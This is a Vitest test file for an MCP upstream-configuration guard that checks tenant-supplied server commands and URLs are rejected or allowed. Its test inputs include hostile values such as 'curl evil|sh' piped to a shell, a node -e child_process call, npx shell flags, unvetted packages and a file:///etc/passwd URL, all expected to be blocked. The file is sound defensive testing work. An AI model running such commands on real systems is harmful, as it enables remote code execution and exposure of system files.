import { describe, test, expect, afterEach } from "vitest";
import { validateUpstreamConfig } from "../server/mcp/upstream-guard";
import { CATALOG, resolveArgs } from "../server/mcp/catalog";

afterEach(() => { delete process.env.MCP_UPSTREAM_ALLOW_ANY; });

describe("validateUpstreamConfig — blocks tenant→host command execution", () => {
  test("sh-injection: raw shell command rejected", () => {
    expect(validateUpstreamConfig({ transport: "stdio", command: "/bin/sh", args: ["-c", "curl evil|sh"] }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "stdio", command: "sh", args: ["-c", "id"] }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "stdio", command: "bash" }).ok).toBe(false);
  });

  test("node-eval: node excluded (node -e is arbitrary code)", () => {
    expect(validateUpstreamConfig({ transport: "stdio", command: "node", args: ["-e", "require('child_process').exec('id')"] }).ok).toBe(false);
  });

  test("npx-call-flag: allowed runtime + shell flag rejected", () => {
    expect(validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-c", "id"] }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["--call", "id"] }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["--package", "x", "--call", "id"] }).ok).toBe(false);
  });

  test("arbitrary-package: allowed runtime, unvetted package rejected", () => {
    expect(validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "evil-pkg"] }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "stdio", command: "uvx", args: ["totally-not-mcp"] }).ok).toBe(false);
    // allowed runtime with no package at all is also rejected
    expect(validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y"] }).ok).toBe(false);
  });

  test("path-command: non-basename rejected (PATH escape / symlink)", () => {
    expect(validateUpstreamConfig({ transport: "stdio", command: "./x", args: ["mcp-server-git"] }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "stdio", command: "/usr/bin/npx", args: ["-y", "@modelcontextprotocol/server-memory"] }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "stdio", command: "../npx", args: ["-y", "@modelcontextprotocol/server-memory"] }).ok).toBe(false);
  });

  test("unknown-transport rejected (client treats non-stdio as http)", () => {
    expect(validateUpstreamConfig({ transport: "ws", url: "ws://x" }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: undefined }).ok).toBe(false);
  });

  test("bad args type rejected", () => {
    expect(validateUpstreamConfig({ transport: "stdio", command: "npx", args: [1, 2] as unknown as string[] }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "stdio", command: "npx", args: "notarray" as unknown as string[] }).ok).toBe(false);
  });
});

describe("validateUpstreamConfig — http", () => {
  test("file:/gopher:/data: rejected; http/https allowed", () => {
    expect(validateUpstreamConfig({ transport: "http", url: "file:///etc/passwd" }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "http", url: "gopher://x" }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "http", url: "not a url" }).ok).toBe(false);
    expect(validateUpstreamConfig({ transport: "http", url: "https://example.com/mcp" }).ok).toBe(true);
    expect(validateUpstreamConfig({ transport: "http", url: "http://127.0.0.1:9000/mcp" }).ok).toBe(true);
  });
});

describe("validateUpstreamConfig — legitimate paths pass", () => {
  test("catalog npx/uvx entries + free-form path args allowed", () => {
    expect(validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-memory"] }).ok).toBe(true);
    // filesystem's trailing absolute path arg is not the package token → allowed
    expect(validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "/Users/x/.llm-mission-control/mcp-fs"] }).ok).toBe(true);
    expect(validateUpstreamConfig({ transport: "stdio", command: "uvx", args: ["mcp-server-git"] }).ok).toBe(true);
  });

  test("escape hatch MCP_UPSTREAM_ALLOW_ANY=1 permits arbitrary stdio (local only)", () => {
    process.env.MCP_UPSTREAM_ALLOW_ANY = "1";
    expect(validateUpstreamConfig({ transport: "stdio", command: "/bin/sh", args: ["-c", "id"] }).ok).toBe(true);
    // transport enum is still enforced even with the hatch open
    expect(validateUpstreamConfig({ transport: "ws" }).ok).toBe(false);
  });
});

describe("regression: every curated catalog entry passes the guard", () => {
  test("all CATALOG commands validate ok (catalog not broken by the guard)", () => {
    for (const entry of CATALOG) {
      const r = validateUpstreamConfig({ transport: entry.transport, command: entry.command, args: resolveArgs(entry, "/Users/x") });
      expect(r.ok, `${entry.id} should pass`).toBe(true);
    }
  });
});
